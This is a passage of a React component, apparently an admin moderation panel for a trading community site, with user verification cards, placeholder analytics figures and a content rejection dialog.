                      <h4 className="text-lg font-semibold text-white mb-3">{verification.username}</h4>
                      <div className="space-y-2 text-sm">
                        <div>
                          <span className="text-gray-400">Request Type:</span>
                          <Badge variant="outline" className="ml-2 border-orange-500 text-orange-400">
                            {verification.requestType}
                          </Badge>
                        </div>
                        <div>
                          <span className="text-gray-400">Submitted:</span>
                          <span className="text-white ml-2">
                            {new Date(verification.submittedDate).toLocaleDateString()}
                          </span>
                        </div>
                        <div>
                          <span className="text-gray-400">Experience:</span>
                          <span className="text-white ml-2">{verification.tradingExperience}</span>
                        </div>
                        <div>
                          <span className="text-gray-400">Specialties:</span>
                          <div className="mt-1 space-y-1">
                            {verification.specialties.map((specialty, i) => (
                              <Badge key={i} variant="outline" className="text-xs mr-1">
                                {specialty}
                              </Badge>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Documents */}
                    <div>
                      <h5 className="font-semibold text-white mb-3">Submitted Documents</h5>
                      <div className="space-y-3">
                        {verification.documents.map((doc, i) => (
                          <div key={i} className="bg-gray-800/50 rounded-lg p-3">
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-sm font-medium text-white capitalize">
                                {doc.type.replace('_', ' ')}
                              </span>
                              <Badge variant={doc.status === 'verified' ? 'default' : 'secondary'}>
                                {doc.status}
                              </Badge>
                            </div>
                            <div className="text-xs text-gray-400">{doc.name}</div>
                            <div className="flex gap-2 mt-2">
                              <Button size="sm" variant="outline" className="text-xs">
                                <Eye className="w-3 h-3 mr-1" />
                                View
                              </Button>
                              <Button size="sm" variant="outline" className="text-xs">
                                <Download className="w-3 h-3 mr-1" />
                                Download
                              </Button>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Actions */}
                    <div className="space-y-3">
                      <div className="grid grid-cols-2 gap-2">
                        <Button 
                          size="sm" 
                          className="bg-green-600 hover:bg-green-700"
                          onClick={() => handleUserVerification(verification.userId, 'approve', 'verified')}
                        >
                          <CheckCircle className="w-4 h-4 mr-1" />
                          Verify
                        </Button>
                        <Button 
                          size="sm" 
                          variant="destructive"
                          onClick={() => handleUserVerification(verification.userId, 'reject')}
                        >
                          <XCircle className="w-4 h-4 mr-1" />
                          Reject
                        </Button>
                      </div>

                      <Button 
                        variant="outline" 
                        className="w-full"
                        onClick={() => handleUserVerification(verification.userId, 'approve', 'pro')}
                      >
                        <Crown className="w-4 h-4 mr-2" />
                        Grant Pro Status
                      </Button>

                      <Button variant="outline" className="w-full">
                        <Users className="w-4 h-4 mr-2" />
                        View Full Profile
                      </Button>

                      <Button variant="outline" className="w-full">
                        <MessageSquare className="w-4 h-4 mr-2" />
                        Message User
                      </Button>

                      {/* Admin Notes */}
                      <div>
                        <label className="text-sm font-medium text-white">Admin Notes:</label>
                        <Textarea
                          placeholder="Add verification notes..."
                          className="mt-1 bg-gray-800 border-gray-600 text-sm"
                          rows={3}
                        />
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Analytics */}
        <TabsContent value="analytics" className="space-y-6">
          <div className="text-center py-12">
            <BarChart3 className="w-16 h-16 mx-auto mb-4 text-blue-400" />
            <h3 className="text-xl font-semibold text-white mb-2">Community Analytics Dashboard</h3>
            <p className="text-gray-400 mb-6">
              Detailed analytics for charts, code, streams, competitions and user engagement
            </p>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto">
              <Card className="bg-gray-900/50 border-gray-700 p-4">
                <div className="text-2xl font-bold text-blue-400">2,847</div>
                <div className="text-sm text-gray-400">Charts Shared</div>
              </Card>
              <Card className="bg-gray-900/50 border-gray-700 p-4">
                <div className="text-2xl font-bold text-green-400">1,205</div>
                <div className="text-sm text-gray-400">Code Repositories</div>
              </Card>
              <Card className="bg-gray-900/50 border-gray-700 p-4">
                <div className="text-2xl font-bold text-red-400">347</div>
                <div className="text-sm text-gray-400">Live Streams</div>
              </Card>
              <Card className="bg-gray-900/50 border-gray-700 p-4">
                <div className="text-2xl font-bold text-purple-400">23</div>
                <div className="text-sm text-gray-400">Active Competitions</div>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>

      {/* Approval/Rejection Modal */}
      <Dialog open={showApprovalModal} onOpenChange={setShowApprovalModal}>
        <DialogContent className="bg-gray-900 border-gray-700 text-white">
          <DialogHeader>
            <DialogTitle>Content Moderation</DialogTitle>
            <DialogDescription>
              Provide a reason for rejecting this content
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <label className="text-sm font-medium text-white">Rejection Reason</label>
              <Select>
                <SelectTrigger className="bg-gray-800 border-gray-600">
                  <SelectValue placeholder="Select reason" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="inappropriate">Inappropriate Content</SelectItem>
                  <SelectItem value="spam">Spam or Promotional</SelectItem>
                  <SelectItem value="misinformation">Misinformation</SelectItem>
                  <SelectItem value="copyright">Copyright Violation</SelectItem>
                  <SelectItem value="manipulation">Market Manipulation</SelectItem>
                  <SelectItem value="other">Other</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <label className="text-sm font-medium text-white">Additional Notes</label>
              <Textarea
                placeholder="Provide additional context..."
                className="bg-gray-800 border-gray-600"
                rows={3}
              />
            </div>
            <div className="flex gap-3">
              <Button variant="ghost" onClick={() => setShowApprovalModal(false)}>
                Cancel
              </Button>
              <Button 
                variant="destructive"
                onClick={() => {
                  setShowApprovalModal(false)
                  toast.success('Content rejected and removed!')
                }}
              >
                Reject Content
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
